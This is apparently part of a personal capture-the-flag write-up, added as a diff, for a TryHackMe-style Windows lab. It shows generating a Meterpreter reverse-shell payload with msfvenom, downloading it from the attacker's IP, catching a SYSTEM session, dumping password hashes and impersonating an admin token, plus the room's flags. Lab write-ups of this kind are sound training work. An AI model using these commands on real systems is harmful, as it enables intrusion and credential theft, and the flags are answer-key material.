@@ -445,3 +445,451 @@ d-r---        4/12/2020   1:27 AM                Desktop
 d-r---        4/12/2020   1:27 AM                Documents                     
 d-r---        4/12/2020   1:27 AM                Downloads                     
 d-r---        4/12/2020   1:27 AM                Favorites                     
+d-r---        4/12/2020   1:27 AM                Links                         
+d-r---        4/12/2020   1:27 AM                Music                         
+d-r---        4/12/2020   1:27 AM                Pictures                      
+d-r---        4/12/2020   1:27 AM                Saved Games                   
+d-r---        4/12/2020   1:27 AM                Searches                      
+d-r---        4/12/2020   1:27 AM                Videos                        
+
+PS C:\users\Administrator> cd Desktop
+PS C:\users\Administrator\Desktop> ls
+
+    Directory: C:\users\Administrator\Desktop
+
+Mode                LastWriteTime         Length Name                          
+----                -------------         ------ ----                          
+-a----        3/28/2020  12:39 PM             37 user.txt                      
+
+PS C:\users\Administrator\Desktop> cat user.txt
+thm{09b408056a13fc222f33e6e4cf599f8c}
+
+PS C:\users\Equinox\Desktop> dir -force
+
+    Directory: C:\users\Equinox\Desktop
+
+Mode                LastWriteTime         Length Name                          
+----                -------------         ------ ----                          
+-a-hs-        4/11/2020  11:55 AM            282 desktop.ini  
+
+PS C:\users\admin> ls -force
+PS C:\users\admin> ls : Access to the path 'C:\users\admin' is denied.
+At line:1 char:1
++ ls -force
++ ~~~~~~~~~
+    + CategoryInfo          : PermissionDenied: (C:\users\admin:String) [Get-C 
+   hildItem], UnauthorizedAccessException
+    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell. 
+   Commands.GetChildItemCommand
+
+PS C:\users\SuperAdmin> ls : Access to the path 'C:\users\SuperAdmin' is denied.
+At line:1 char:1
++ ls
++ ~~
+    + CategoryInfo          : PermissionDenied: (C:\users\SuperAdmin:String) [ 
+   Get-ChildItem], UnauthorizedAccessException
+    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell. 
+   Commands.GetChildItemCommand
+ 
+
+PS C:\users\SuperAdmin> cat C:\users\SuperAdmin\Desktop\root.txt
+thm{a1f936a086b367761cc4e7dd6cd2e2bd}
+
+PS C:\users\SuperAdmin> get-acl C:\users\SuperAdmin
+
+    Directory: C:\users
+
+Path       Owner               Access                                          
+----       -----               ------                                          
+SuperAdmin NT AUTHORITY\SYSTEM BUILTIN\Administrators Deny  FullControl...     
+
+PS C:\users\SuperAdmin> get-acl C:\users\SuperAdmin |fl
+
+Path   : Microsoft.PowerShell.Core\FileSystem::C:\users\SuperAdmin
+Owner  : NT AUTHORITY\SYSTEM
+Group  : NT AUTHORITY\SYSTEM
+Access : BUILTIN\Administrators Deny  FullControl
+         S-1-5-21-297466380-2647629429-287235700-1000 Allow  FullControl
+Audit  : 
+Sddl   : O:SYG:SYD:PAI(D;OICI;FA;;;BA)(A;OICI;FA;;;S-1-5-21-297466380-264762942
+         9-287235700-1000)
+
+https://blog.didierstevens.com//generating-powershell-scripts-with-msfvenom-on-windows/
+
+https://www.puckiestyle.nl/meterpreter-reverse-shell-with-powershell/
+
+┌──(witty㉿kali)-[~/Downloads/Subrake]
+└─$ msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.8.19.103; set lport 1338; set ExitOnSession false; exploit -j"
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.8.19.103 LPORT=1338 -f psh -o meterpreter-64.ps1
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of psh file: 3266 bytes
+Saved as: meterpreter-64.ps1
+
+PS C:\users\SuperAdmin> powershell -command "& { iwr 10.8.19.103/meterpreter-64.ps1 -OutFile C:\Users\Administrator\Desktop\meterpreter-64.ps1 }"
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.40.206 - - [22/Jul/2023 18:23:03] "GET /meterpreter-64.ps1 HTTP/1.1" 200 -
+
+PS C:\users\SuperAdmin> cd C:\Users\Administrator\Desktop\
+PS C:\Users\Administrator\Desktop> ls
+
+    Directory: C:\Users\Administrator\Desktop
+
+Mode                LastWriteTime         Length Name                          
+----                -------------         ------ ----                          
+-a----        7/22/2023   3:23 PM           3266 meterpreter-64.ps1            
+-a----        3/28/2020  12:39 PM             37 user.txt    
+
+PS C:\Users\Administrator\Desktop> Import-Module .\meterpreter-64.ps1
+1700
+
+┌──(witty㉿kali)-[~/Downloads/Subrake]
+└─$ msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.8.19.103; set lport 1338; set ExitOnSession false; exploit -j"
+                                                  
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%     %%%         %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%  %%  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%  %  %%%%%%%%   %%%%%%%%%%% https://metasploit.com %%%%%%%%%%%%%%%%%%%%%%%%
+%%  %%  %%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%  %%%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%  %%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%    %%   %%%%%%%%%%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%  %%%%%
+%%%%  %%  %%  %      %%      %%    %%%%%      %    %%%%  %%   %%%%%%       %%
+%%%%  %%  %%  %  %%% %%%%  %%%%  %%  %%%%  %%%%  %% %%  %% %%% %%  %%%  %%%%%
+%%%%  %%%%%%  %%   %%%%%%   %%%%  %%%  %%%%  %%    %%  %%% %%% %%   %%  %%%%%
+%%%%%%%%%%%% %%%%     %%%%%    %%  %%   %    %%  %%%%  %%%%   %%%   %%%     %
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+       =[ metasploit v6.3.4-dev                           ]
++ -- --=[ 2294 exploits - 1200 auxiliary - 409 post       ]
++ -- --=[ 968 payloads - 45 encoders - 11 nops            ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit tip: You can use help to view all 
+available commands
+Metasploit Documentation: https://docs.metasploit.com/
+
+[*] Using configured payload generic/shell_reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+lhost => 10.8.19.103
+lport => 1338
+ExitOnSession => false
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP handler on 10.8.19.103:1338
+```
+```text
+msf6 exploit(multi/handler) > [*] Sending stage (200774 bytes) to 10.10.40.206
+[*] Meterpreter session 1 opened (10.8.19.103:1338 -> 10.10.40.206:50070) -0400
+```
+```text
+msf6 exploit(multi/handler) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type             Information      Connection
+  --  ----  ----             -----------      ----------
+  1         meterpreter x64  NT AUTHORITY\SY  10.8.19.103:1338
+            /windows         STEM @ WIN-8VMB   -> 10.10.40.206
+                             KF3G815          :50070 (10.10.40
+                                              .206)
+```
+```text
+msf6 exploit(multi/handler) > sessions -i 1
+[*] Starting interaction with 1...
+```
+```text
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+```
+
+## Privilege Escalation
+```text
+meterpreter > hashdump
+Admin:1003:aad3b435b51404eeaad3b435b51404ee:25f46396c818314f78cafba3fd1e5596:::
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:2182eed0101516d0a206b98c579565e6:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Equinox:1001:aad3b435b51404eeaad3b435b51404ee:e40d1ba38afa3fe8264af701b7ca9b7c:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Sunlight:1002:aad3b435b51404eeaad3b435b51404ee:d54b9ad80935dd57769e8eae3e655927:::
+
+https://www.offsec.com/metasploit-unleashed/fun-incognito/
+
+PS C:\Users\Administrator\Desktop> cat C:\Users\Admin\Desktop\root.txt
+PS C:\Users\Administrator\Desktop> cat : Cannot find path 'C:\Users\Admin\Desktop\root.txt' because it does not 
+exist.
+At line:1 char:1
++ cat C:\Users\Admin\Desktop\root.txt
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (C:\Users\Admin\Desktop\root.txt 
+   :String) [Get-Content], ItemNotFoundException
+    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetCo 
+   ntentCommand
+```
+```text
+meterpreter > use incognito
+Loading extension incognito...Success.
+```
+```text
+meterpreter > help
+
+Core Commands
+=============
+
+    Command       Description
+    -------       -----------
+    ?             Help menu
+    background    Backgrounds the current session
+    bg            Alias for background
+    bgkill        Kills a background meterpreter script
+    bglist        Lists running background scripts
+    bgrun         Executes a meterpreter script as a background thread
+    channel       Displays information or control active channels
+    close         Closes a channel
+    detach        Detach the meterpreter session (for http/https)
+    disable_unic  Disables encoding of unicode strings
+    ode_encoding
+    enable_unico  Enables encoding of unicode strings
+    de_encoding
+    exit          Terminate the meterpreter session
+    get_timeouts  Get the current session timeout values
+    guid          Get the session GUID
+    help          Help menu
+    info          Displays information about a Post module
+    irb           Open an interactive Ruby shell on the current session
+    load          Load one or more meterpreter extensions
+    machine_id    Get the MSF ID of the machine attached to the session
+    migrate       Migrate the server to another process
+    pivot         Manage pivot listeners
+    pry           Open the Pry debugger on the current session
+    quit          Terminate the meterpreter session
+    read          Reads data from a channel
+    resource      Run the commands stored in a file
+    run           Executes a meterpreter script or Post module
+    secure        (Re)Negotiate TLV packet encryption on the session
+    sessions      Quickly switch to another session
+    set_timeouts  Set the current session timeout values
+    sleep         Force Meterpreter to go quiet, then re-establish session
+    ssl_verify    Modify the SSL certificate verification setting
+    transport     Manage the transport mechanisms
+    use           Deprecated alias for "load"
+    uuid          Get the UUID for the current session
+    write         Writes data to a channel
+
+Stdapi: File system Commands
+============================
+
+    Command       Description
+    -------       -----------
+    cat           Read the contents of a file to the screen
+    cd            Change directory
+    checksum      Retrieve the checksum of a file
+    cp            Copy source to destination
+    del           Delete the specified file
+    dir           List files (alias for ls)
+    download      Download a file or directory
+    edit          Edit a file
+    getlwd        Print local working directory
+    getwd         Print working directory
+    lcat          Read the contents of a local file to the screen
+    lcd           Change local working directory
+    lls           List local files
+    lpwd          Print local working directory
+    ls            List files
+    mkdir         Make directory
+    mv            Move source to destination
+    pwd           Print working directory
+    rm            Delete the specified file
+    rmdir         Remove directory
+    search        Search for files
+    show_mount    List all mount points/logical drives
+    upload        Upload a file or directory
+
+Stdapi: Networking Commands
+===========================
+
+    Command       Description
+    -------       -----------
+    arp           Display the host ARP cache
+    getproxy      Display the current proxy configuration
+    ifconfig      Display interfaces
+    ipconfig      Display interfaces
+    netstat       Display the network connections
+    portfwd       Forward a local port to a remote service
+    resolve       Resolve a set of host names on the target
+    route         View and modify the routing table
+
+Stdapi: System Commands
+=======================
+
+    Command       Description
+    -------       -----------
+    clearev       Clear the event log
+    drop_token    Relinquishes any active impersonation token.
+    execute       Execute a command
+    getenv        Get one or more environment variable values
+    getpid        Get the current process identifier
+    getprivs      Attempt to enable all privileges available to the current process
+    getsid        Get the SID of the user that the server is running as
+    getuid        Get the user that the server is running as
+    kill          Terminate a process
+    localtime     Displays the target system local date and time
+    pgrep         Filter processes by name
+    pkill         Terminate processes by name
+    ps            List running processes
+    reboot        Reboots the remote computer
+    reg           Modify and interact with the remote registry
+    rev2self      Calls RevertToSelf() on the remote machine
+    shell         Drop into a system command shell
+    shutdown      Shuts down the remote computer
+    steal_token   Attempts to steal an impersonation token from the target process
+    suspend       Suspends or resumes a list of processes
+    sysinfo       Gets information about the remote system, such as OS
+
+Stdapi: User interface Commands
+===============================
+
+    Command       Description
+    -------       -----------
+    enumdesktops  List all accessible desktops and window stations
+    getdesktop    Get the current meterpreter desktop
+    idletime      Returns the number of seconds the remote user has been idle
+    keyboard_sen  Send keystrokes
+    d
+    keyevent      Send key events
+    keyscan_dump  Dump the keystroke buffer
+    keyscan_star  Start capturing keystrokes
+    t
+    keyscan_stop  Stop capturing keystrokes
+    mouse         Send mouse events
+    screenshare   Watch the remote user desktop in real time
+    screenshot    Grab a screenshot of the interactive desktop
+    setdesktop    Change the meterpreters current desktop
+    uictl         Control some of the user interface components
+
+Stdapi: Webcam Commands
+=======================
+
+    Command       Description
+    -------       -----------
+    record_mic    Record audio from the default microphone for X seconds
+    webcam_chat   Start a video chat
+    webcam_list   List webcams
+    webcam_snap   Take a snapshot from the specified webcam
+    webcam_strea  Play a video stream from the specified webcam
+    m
+
+Stdapi: Audio Output Commands
+=============================
+
+    Command       Description
+    -------       -----------
+    play          play a waveform audio file (.wav) on the target system
+
+Priv: Elevate Commands
+======================
+
+    Command       Description
+    -------       -----------
+    getsystem     Attempt to elevate your privilege to that of local system.
+
+Priv: Password database Commands
+================================
+
+    Command       Description
+    -------       -----------
+    hashdump      Dumps the contents of the SAM database
+
+Priv: Timestomp Commands
+========================
+
+    Command       Description
+    -------       -----------
+    timestomp     Manipulate file MACE attributes
+
+Incognito Commands
+==================
+
+    Command       Description
+    -------       -----------
+    add_group_us  Attempt to add a user to a global group with all tokens
+    er
+    add_localgro  Attempt to add a user to a local group with all tokens
+    up_user
+    add_user      Attempt to add a user with all tokens
+    impersonate_  Impersonate specified token
+    token
+    list_tokens   List tokens available under current user context
+    snarf_hashes  Snarf challenge/response hashes for every token
+```
+```text
+meterpreter > list_tokens -u
+
+Delegation Tokens Available
+========================================
+NT AUTHORITY\LOCAL SERVICE
+NT AUTHORITY\NETWORK SERVICE
+NT AUTHORITY\SYSTEM
+WIN-8VMBKF3G815\Admin
+Window Manager\DWM-1
+
+Impersonation Tokens Available
+========================================
+No tokens available
+```
+```text
+meterpreter > impersonate_token "WIN-8VMBKF3G815\Admin"
+[+] Delegation token available
+[+] Successfully impersonated user WIN-8VMBKF3G815\Admin
+```
+```text
+meterpreter > shell
+Process 5084 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+E:\xampp\htdocs\internal>whoami
+whoami
+win-8vmbkf3g815\admin
+
+E:\xampp\htdocs\internal>dir C:\Users\Admin\Desktop
+dir C:\Users\Admin\Desktop
+ Volume in drive C has no label.
+ Volume Serial Number is 7805-3F28
+
+ Directory of C:\Users\Admin\Desktop
+
+04/12/2020  01:17 AM    <DIR>          .
+04/12/2020  01:17 AM    <DIR>          ..
+03/28/2020  12:39 PM                37 root.txt
+               1 File(s)             37 bytes
+               2 Dir(s)  39,239,380,992 bytes free
+
+E:\xampp\htdocs\internal>type C:\Users\Admin\Desktop\root.txt
+type C:\Users\Admin\Desktop\root.txt
+thm{a1f936a086b367761cc4e7dd6cd2e2bd}
+```
+![[Pasted image 20230722161811.png]]
+user.txt
+root.txt
+
+## Flags / Answers
+- ***thm{09b408056a13fc222f33e6e4cf599f8c}***
+- ***thm{a1f936a086b367761cc4e7dd6cd2e2bd}***
+
+## Notes / Lessons Learned
+[[Fusion Corp]]
+
